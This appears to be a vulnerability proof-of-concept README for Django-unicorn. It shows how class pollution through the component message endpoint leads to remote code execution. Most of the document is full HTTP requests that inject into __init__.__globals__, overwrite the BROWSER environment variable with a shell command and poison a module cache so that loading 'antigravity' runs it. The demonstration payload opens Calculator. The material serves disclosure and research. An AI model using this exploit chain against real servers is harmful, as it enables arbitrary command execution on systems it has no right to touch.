# Class Pollution Demo for Django-unicorn

## Django-unicorn
Django-unicorn is a full-stack framework for building django apps with unicorn views, unicorn fields, and unicorn components. The python class pollution origniated from its component request handling process.

## Deploy

Run the following command to deploy the app:
```
python manage.py runserver
```

## PoC

The checksum and corresponding encrypted data can be obtained from front-end source code.

```
POST /unicorn/message/todo HTTP/1.1
Host: proof-of-concept:8000
Cookie: csrftoken=OATsBHC6Q6LEF4qWFWyY5Efrcq9nf6RxuD6TR06vIs1zaKPLQwlKJMYv8LZTA2Fo;
Connection: keep-alive
Accept: Application/json
X-CSRFToken: foA7F7t1ICwsHVsgTfPAC12n00ZvNqpTVrNyVqXqAYMncBR54PCmg9LrWlP18mdK
Content-Length: 214

{
"id":  123,
"actionQueue":[{"type": "syncInput",
	"payload": {
"name": "__init__.__globals__.timed",
"value":"polluted"
}
}],
"data":{"task":"","tasks":[]},
"epoch": "123",
"checksum": "N5mmXeUP"
}

```

### Remote Code Execution PoC:

0x01: Pollute OS environment variable `BROWSER`:
```http
POST /unicorn/message/todo HTTP/1.1
Host: proof-of-concept:8000
Content-Length: 268
X-CSRFTOKEN: N8r6yhMfrAdq3OmDn7P0x0xdrZ5ZrkQk
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: application/json
DNT: 1
Content-Type: text/plain;charset=UTF-8
Origin: http://proof-of-concept:8000
Referer: http://proof-of-concept:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: csrftoken=N8r6yhMfrAdq3OmDn7P0x0xdrZ5ZrkQk
Connection: close

{
"id":  123,
"actionQueue":[{"type": "syncInput",
	"payload": {
"name": "__init__.__globals__.sys.modules.os.environ",
"value":{"BROWSER":"/bin/sh -c \"open -a Calculator\" #%s"}
}
}],
"data":{"task":"","tasks":[]},
"epoch": "123",
"checksum": "N5mmXeUP"
}
```

0x02: Pollute cache variable leading to arbitrary module loading:
```http
POST /unicorn/message/todo HTTP/1.1
Host: proof-of-concept:8000
Content-Length: 249
X-CSRFTOKEN: N8r6yhMfrAdq3OmDn7P0x0xdrZ5ZrkQk
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: application/json
DNT: 1
Content-Type: text/plain;charset=UTF-8
Origin: http://proof-of-concept:8000
Referer: http://proof-of-concept:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: csrftoken=N8r6yhMfrAdq3OmDn7P0x0xdrZ5ZrkQk
Connection: close

{
"id":  123,
"actionQueue":[{"type": "syncInput",
	"payload": {
"name": "__init__.__globals__.location_cache._Cache__data.todo",
"value":["antigravity", "any"]
}
}],
"data":{"task":"","tasks":[]},
"epoch": "123",
"checksum": "N5mmXeUP"
}
```

0x03: Accessing django-unicorn app will trigger the `antigravity` module loading, which executes the command stored in os environment variable `BROWSER` intentionally opening a browser instance, but leads to remote code execution. In this case, the command is `open -a Calculator`.

```http
GET / HTTP/1.1
Host: proof-of-concept:8000
Cookie: csrftoken=N8r6yhMfrAdq3OmDn7P0x0xdrZ5ZrkQk
Connection: close

```


